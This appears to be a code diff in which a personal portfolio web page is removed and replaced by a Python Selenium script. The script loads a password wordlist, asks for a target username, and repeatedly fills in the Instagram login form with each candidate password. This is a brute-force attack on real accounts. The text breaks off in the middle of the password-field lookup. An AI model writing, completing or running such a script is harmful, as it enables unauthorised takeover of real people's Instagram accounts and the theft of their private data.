@@ -1,106 +1,42 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Noman Zulfiqar | MLSA</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            /* ✨ Luxury Golden Gradient */
-            background: linear-gradient(135deg, #B38728, #FBF5B7, #BF953F);
-            color: #1a1a1a;
-            text-align: center;
-        }
-        .container {
-            background: rgba(0, 0, 0, 0.75); /* Dark semi-transparent box */
-            padding: 30px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            border: 2px solid #D4AF37; /* Gold border */
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            max-width: 400px;
-            width: 90%;
-            color: white;
-        }
-        h1 { margin: 0; font-size: 2.5em; color: #D4AF37; } /* Gold Title */
-        #greeting { font-size: 1.2em; font-weight: bold; color: #FBF5B7; margin-bottom: 5px; }
-        #typewriter { font-size: 1.1em; opacity: 0.9; min-height: 1.2em; color: #f2f2f2; }
-        
-        .badge {
-            background: #D4AF37; /* Gold Badge */
-            color: #000;
-            padding: 5px 15px;
-            border-radius: 50px;
-            font-weight: bold;
-            display: inline-block;
-            margin-top: 10px;
-            font-size: 0.8em;
-        }
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+import time
 
-        .btn {
-            color: #D4AF37;
-            margin: 10px 10px;
-            text-decoration: none;
-            border: 2px solid #D4AF37;
-            padding: 8px 20px;
-            border-radius: 5px;
-            font-size: 0.9em;
-            display: inline-block;
-            font-weight: bold;
-            transition: all 0.3s ease;
-        }
+ascii_art = '''
+ __  __            _  __              _
+|  \/  |_ __      | |/ /___ _ __ __ _| |
+| |\/| | '__|     | ' // _ \ '__/ _` | |
+| |  | | |     _  | . \  __/ | | (_| | |
+|_|  |_|_|    (_) |_|\_\___|_|  \__,_|_|
+'''
+print(ascii_art) 
 
-        .btn:hover {
-            background: #D4AF37;
-            color: #000;
-            transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.4);
-        }
+wordlist_name = input("Please enter your wordlist file's name : ")
 
-        .footer { margin-top: 20px; font-size: 0.8em; opacity: 0.6; color: #D4AF37; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div id="greeting">Loading...</div>
-        <div class="badge">Microsoft Learn Student Ambassador</div>
-        <h1>Noman Zulfiqar</h1>
-        <p id="typewriter"></p>
-        <hr style="border: 0.5px solid rgba(212,175,55,0.3); margin: 20px 0;">
-        <p>My first website successfully deployed via <b>GitHub Pages</b>!</p>
+wordlisttxt = open(f"{wordlist_name}.txt","r")
 
-        <div style="margin-top: 20px;">
-            <a href="https://www.linkedin.com/in/noman-zulfiqar-0916833a4" target="_blank" class="btn">LinkedIn</a>
-            <a href="https://github.com/nomanzulfiqar121-ctrl" target="_blank" class="btn">GitHub</a>
-        </div>
+wordlist = wordlisttxt.readlines()
 
-        <div class="footer">Built with ❤️ and AI Support</div>
-    </div>
+wordlisttxt.close()
 
-    <script>
-        const hour = new Date().getHours();
-        const greetingElement = document.getElementById('greeting');
-        if (hour < 12) greetingElement.innerText = "Good Morning! ☀️";
-        else if (hour < 18) greetingElement.innerText = "Good Afternoon! ☁️";
-        else greetingElement.innerText = "Good Evening! 🌙";
+adminusername = input("Please enter username : ")
 
-        const text = "Future Cloud Engineer & Developer";
-        let index = 0;
-        function typeEffect() {
-            if (index < text.length) {
-                document.getElementById("typewriter").innerHTML += text.charAt(index);
-                index++;
-                setTimeout(typeEffect, 100);
-            }
-        }
-        window.onload = typeEffect;
-    </script>
-</body>
-</html>
+key = None
+
+i = 0
+
+for sifre in wordlist:
+
+    browser = webdriver.Chrome()
+
+    browser.get("https://www.instagram.com/")
+
+    browser.maximize_window()
+
+    time.sleep(1)
+
+    username = browser.find_element(By.XPATH,'//*[@id="loginForm"]/div/div[1]/div/label/input')
+    username.send_keys(adminusername)
+
+    password = browser.find_element(By.XPATH,'//*[@id="loginForm"]/div/div[2]/div/label/
